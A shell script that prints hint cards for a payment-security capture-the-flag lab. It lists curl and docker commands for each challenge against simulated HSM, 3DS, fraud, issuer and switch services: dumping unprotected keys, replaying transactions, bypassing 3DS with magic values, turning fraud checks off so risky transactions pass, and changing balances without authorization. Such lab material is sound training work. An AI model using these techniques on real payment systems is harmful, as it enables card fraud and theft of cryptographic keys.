#!/usr/bin/env sh
set -eu

show_list() {
  cat <<'EOF'
Usage:
  lab <CHALLENGE_CODE>

Examples:
  lab HSM-001
  lab MITM-001

Available challenges:
  HSM-001  HSM-002  HSM-003  HSM-004  HSM-005
  REPLAY-001  REPLAY-002
  3DS-001  3DS-002  3DS-003
  FRAUD-001  FRAUD-002
  ISO-001  ISO-002
  PIN-001  PIN-002
  MITM-001
  PRIV-001
  CRYPTO-001  CRYPTO-002
EOF
}

if [ $# -eq 0 ]; then
  show_list
  exit 0
fi

CODE="$(printf '%s' "$1" | tr '[:lower:]' '[:upper:]')"

case "$CODE" in
  HSM-001)
    cat <<'EOF'
HSM-001 - Le Coffre Ouvert
Blackbox objective: discover unprotected key-management endpoint.

Recon:
  curl -i http://hsm-simulator:8011/hsm/status
  curl -i http://hsm-simulator:8011/hsm/keys

Evidence:
  curl -s http://hsm-simulator:8011/hsm/keys | jq
EOF
    ;;
  HSM-002)
    cat <<'EOF'
HSM-002 - Cles Previsibles
Blackbox objective: find weak/default key material.

Recon:
  curl -s http://hsm-simulator:8011/hsm/keys | jq
  curl -s http://hsm-simulator:8011/hsm/keys | jq '.[] | select(.label|test("ZPK|TEST";"i"))'

Evidence:
  curl -s http://hsm-simulator:8011/hsm/keys | jq -r '.[] | [.label,.key] | @tsv'
EOF
    ;;
  HSM-003)
    cat <<'EOF'
HSM-003 - Fuite dans les Logs
Blackbox objective: enable vulnerable debug behavior and observe leaked secrets.

Enable vuln mode:
  curl -s -X POST http://hsm-simulator:8011/hsm/config \
    -H "Content-Type: application/json" \
    -d '{"vulnerabilities":{"keyLeakInLogs":true}}' | jq

Trigger operation:
  curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-pin \
    -H "Content-Type: application/json" \
    -d '{"pin":"1234","pan":"4111111111111111","keyLabel":"ZPK_TEST"}' | jq

Log hunting (inside docker host):
  docker logs pmp-hsm-simulator --tail 200 | rg "VULN|LEAK|key"
EOF
    ;;
  HSM-004)
    cat <<'EOF'
HSM-004 - Le Pingouin ECB
Blackbox objective: demonstrate repeated ciphertext blocks in ECB.

Encrypt repeated plaintext:
  curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data \
    -H "Content-Type: application/json" \
    -d '{"data":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","keyLabel":"DEK_AES_001","mode":"ECB"}' | jq

Compare with CBC:
  curl -s -X POST http://hsm-simulator:8011/hsm/encrypt-data \
    -H "Content-Type: application/json" \
    -d '{"data":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","keyLabel":"DEK_AES_001","mode":"CBC"}' | jq
EOF
    ;;
  HSM-005)
    cat <<'EOF'
HSM-005 - Course contre la Montre
Blackbox objective: identify timing side-channel on MAC verification.

Quick latency probe:
  for m in 0011223344556677 0011223344556678 1111223344556677 ffffffffffffffff; do
    time curl -s -X POST http://hsm-simulator:8011/hsm/verify-mac \
      -H "Content-Type: application/json" \
      -d "{\"data\":\"PAYLOAD\",\"keyLabel\":\"ZAK_002\",\"mac\":\"$m\"}" >/dev/null
  done

Next step:
  repeat many times, aggregate timings per prefix.
EOF
    ;;
  REPLAY-001)
    cat <<'EOF'
REPLAY-001 - Deja Vu
Blackbox objective: replay an identical transaction successfully.

Enable replay vulnerability:
  curl -s -X POST http://hsm-simulator:8011/hsm/config \
    -H "Content-Type: application/json" \
    -d '{"vulnerabilities":{"allowReplay":true}}' | jq

Send same payload twice:
  PAYLOAD='{"pan":"4111111111111111","amount":75,"currency":"EUR","merchantId":"M123","terminalId":"TERM0001","isEcommerce":true}'
  curl -s -X POST http://api-gateway:8000/api/transaction/process -H "Content-Type: application/json" -d "$PAYLOAD" | jq
  curl -s -X POST http://api-gateway:8000/api/transaction/process -H "Content-Type: application/json" -d "$PAYLOAD" | jq
EOF
    ;;
  REPLAY-002)
    cat <<'EOF'
REPLAY-002 - Reset et Recommence
Blackbox objective: bypass velocity controls after service restart.

Drive velocity counter:
  for i in 1 2 3 4 5 6; do
    curl -s -X POST http://sim-fraud-detection:8007/check \
      -H "Content-Type: application/json" \
      -d '{"pan":"4111111111111111","amount":30,"merchantId":"M1","mcc":"5411"}' | jq
  done

Restart fraud service (from docker host):
  docker restart pmp-sim-fraud-detection

Retest:
  curl -s -X POST http://sim-fraud-detection:8007/check \
    -H "Content-Type: application/json" \
    -d '{"pan":"4111111111111111","amount":30,"merchantId":"M1","mcc":"5411"}' | jq
EOF
    ;;
  3DS-001)
    cat <<'EOF'
3DS-001 - Le Numero Magique
Blackbox objective: authenticate challenge with universal OTP.

Test OTP:
  curl -s -X POST http://acs-simulator:8013/challenge/verify \
    -H "Content-Type: application/json" \
    -d '{"acsTransId":"ACS_TEST","otp":"123456"}' | jq
EOF
    ;;
  3DS-002)
    cat <<'EOF'
3DS-002 - Le Mot de Passe
Blackbox objective: trigger magic-string bypass in 3DS flow.

Probe with magic value:
  curl -s -X POST http://acs-simulator:8013/authenticate \
    -H "Content-Type: application/json" \
    -d '{"pan":"4111111111111111","amount":600,"currency":"EUR","merchantId":"M123","transactionId":"TX-3DS-2","cardholderName":"SUCCESS"}' | jq
EOF
    ;;
  3DS-003)
    cat <<'EOF'
3DS-003 - Juste en Dessous
Blackbox objective: compare 500.00 vs 499.99 behavior.

500.00:
  curl -s -X POST http://api-gateway:8000/api/transaction/process \
    -H "Content-Type: application/json" \
    -d '{"pan":"4111111111111111","amount":500,"currency":"EUR","merchantId":"M123","terminalId":"WEB001","isEcommerce":true}' | jq

499.99:
  curl -s -X POST http://api-gateway:8000/api/transaction/process \
    -H "Content-Type: application/json" \
    -d '{"pan":"4111111111111111","amount":499.99,"currency":"EUR","merchantId":"M123","terminalId":"WEB001","isEcommerce":true}' | jq
EOF
    ;;
  FRAUD-001)
    cat <<'EOF'
FRAUD-001 - Quand la Fraude Dort
Blackbox objective: observe fail-open when fraud dependency is unavailable.

1) Stop fraud service (docker host):
  docker stop pmp-sim-fraud-detection

2) Send risky transaction:
  curl -s -X POST http://api-gateway:8000/api/transaction/process \
    -H "Content-Type: application/json" \
    -d '{"pan":"4111111111111111","amount":1500,"currency":"EUR","merchantId":"M999","terminalId":"WEB001","isEcommerce":true}' | jq

3) Restart service:
  docker start pmp-sim-fraud-detection
EOF
    ;;
  FRAUD-002)
    cat <<'EOF'
FRAUD-002 - Score Optimise
Blackbox objective: craft requests that stay just below decline threshold.

Baseline:
  curl -s -X POST http://sim-fraud-detection:8007/check \
    -H "Content-Type: application/json" \
    -d '{"pan":"5555555555554444","amount":999,"merchantId":"M900","mcc":"5411","country":"FR"}' | jq

Iterate parameters:
  # vary amount/mcc/country/velocity until score remains < high threshold
EOF
    ;;
  ISO-001)
    cat <<'EOF'
ISO-001 - Table de Routage Exposee
Blackbox objective: extract routing topology without auth.

Query endpoint:
  curl -i http://sim-network-switch:8004/transaction/bin-table
  curl -s http://sim-network-switch:8004/transaction/bin-table | jq
EOF
    ;;
  ISO-002)
    cat <<'EOF'
ISO-002 - Montant Maximum
Blackbox objective: exploit oversized accepted amount.

Boundary test:
  curl -s -X POST http://sim-network-switch:8004/transaction \
    -H "Content-Type: application/json" \
    -d '{"mti":"0100","pan":"4111111111111111","processingCode":"000000","amount":999999999.99,"currency":"EUR","transmissionDateTime":"0101120000","localTransactionTime":"120000","localTransactionDate":"0101","stan":"123456","terminalId":"TERM0001","merchantId":"M123","merchantCategoryCode":"5411","expiryDate":"2612","posEntryMode":"010","acquirerReferenceNumber":"ARN1234567890123456789"}' | jq
EOF
    ;;
  PIN-001)
    cat <<'EOF'
PIN-001 - Le Fallback Silencieux
Blackbox objective: get PIN approval under HSM degradation/failure.

Request with invalid-like pinBlock:
  curl -s -X POST http://sim-issuer-service:8005/authorize \
    -H "Content-Type: application/json" \
    -d '{"transactionId":"PIN1","pan":"4111111111111111","amount":10,"currency":"EUR","merchantId":"M123","mcc":"5411","transactionType":"PURCHASE","pinBlock":"FFFFFFFFFFFFFFFF"}' | jq

If needed, increase HSM latency first:
  curl -s -X POST http://hsm-simulator:8011/hsm/config \
    -H "Content-Type: application/json" \
    -d '{"injectedLatencyMs":2500}' | jq
EOF
    ;;
  PIN-002)
    cat <<'EOF'
PIN-002 - Random Previsible
Blackbox objective: prove non-crypto RNG in PIN block generation path.

Blackbox evidence direction:
  1) generate many PIN blocks for same input.
  2) inspect distribution and repeatability.
  3) correlate with PRNG weaknesses.

Starter:
  for i in $(seq 1 50); do
    curl -s -X POST http://crypto-service:8010/crypto/pin/encrypt \
      -H "Content-Type: application/json" \
      -d '{"pin":"1234","pan":"4111111111111111","format":"ISO_1"}'
  done
EOF
    ;;
  MITM-001)
    cat <<'EOF'
MITM-001 - Le CVV Voyageur
Blackbox objective: show CVV leakage in clear through internal transit.

Send transaction carrying CVV:
  curl -s -X POST http://sim-pos-service:8002/transaction \
    -H "Content-Type: application/json" \
    -d '{"pan":"4111111111111111","amount":50,"currency":"EUR","merchantId":"M123","transactionType":"PURCHASE","cvv":"123","expiryMonth":12,"expiryYear":2026}' | jq

Observe relay logs (docker host):
  docker logs pmp-sim-acquirer-service --tail 200 | rg -n "cvv|411111|payload"
  docker logs pmp-sim-network-switch --tail 200 | rg -n "cvv|411111|payload"
EOF
    ;;
  PRIV-001)
    cat <<'EOF'
PRIV-001 - Le Compte en Banque Infini
Blackbox objective: modify account balance without admin authorization.

Direct call:
  curl -i -X PATCH http://sim-issuer-service:8005/accounts/4111111111111111/balance \
    -H "Content-Type: application/json" \
    -d '{"balance":999999}'

Verify with transaction:
  curl -s -X POST http://sim-issuer-service:8005/authorize \
    -H "Content-Type: application/json" \
    -d '{"transactionId":"PRIV1","pan":"4111111111111111","amount":9999,"currency":"EUR","merchantId":"M123","mcc":"5411","transactionType":"PURCHASE"}' | jq
EOF
    ;;
  CRYPTO-001)
    cat <<'EOF'
CRYPTO-001 - Token Predictible
Blackbox objective: demonstrate weak token entropy/predictability.

Collect tokens:
  for i in $(seq 1 30); do
    curl -s -X POST http://tokenization-service:8014/tokenize \
      -H "Content-Type: application/json" \
      -d '{"pan":"4111111111111111","expiry":"1226","cardholder":"CTF USER"}' | jq -r '.token'
  done

Analyze quickly:
  # look for collisions, fixed sections, short randomness
EOF
    ;;
  CRYPTO-002)
    cat <<'EOF'
CRYPTO-002 - Auth Code Guessable
Blackbox objective: infer weak auth code generation pattern.

Generate multiple authorizations:
  for i in $(seq 1 20); do
    curl -s -X POST http://sim-issuer-service:8005/authorize \
      -H "Content-Type: application/json" \
      -d "{\"transactionId\":\"AUTH-$i\",\"pan\":\"4111111111111111\",\"amount\":10,\"currency\":\"EUR\",\"merchantId\":\"M123\",\"mcc\":\"5411\",\"transactionType\":\"PURCHASE\"}" | jq -r '.authCode // .authorizationCode // .response.authCode'
  done

Analyze code shape:
  # inspect sequence, format, and repetition patterns
EOF
    ;;
  *)
    echo "Unknown challenge code: $CODE"
    echo
    show_list
    exit 1
    ;;
esac
